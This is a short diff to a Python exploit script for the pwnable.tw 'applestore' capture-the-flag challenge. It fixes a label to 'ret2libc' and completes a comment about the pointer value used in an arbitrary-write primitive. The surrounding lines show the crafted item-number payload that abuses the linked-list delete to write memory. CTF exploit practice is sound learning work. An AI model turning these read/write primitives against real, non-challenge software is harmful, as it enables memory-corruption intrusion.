@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# Challenge labels: Linked list control (read/write primitives), rop2libc
+# Challenge labels: Linked list control (read/write primitives), ret2libc
 # Other solutions:
 # - https://blog.srikavin.me/posts/pwnable-tw-applestore/ (Overwrite rbp to get write into exe.got.atoi)
 
@@ -64,7 +64,7 @@ def arb_read(addr: int):
 def arb_write(addr: int, val: int):
     # Uses the delete() function to write val into addr
     # Side effect: addr is written into (val + 0xc)
-    # Side effect: The string of the device struct is printed, so it needs to be a valid pointer. We set it to 
+    # Side effect: The string of the device struct is printed, so it needs to be a valid pointer. We set it to 0x8048e00
     sla(b'> ', b'3')
     sna(b'Item Number> ', b'27\x00' + p24(0x8048e) + p32(0x1) + p32(val) + p32(addr - 8))
 
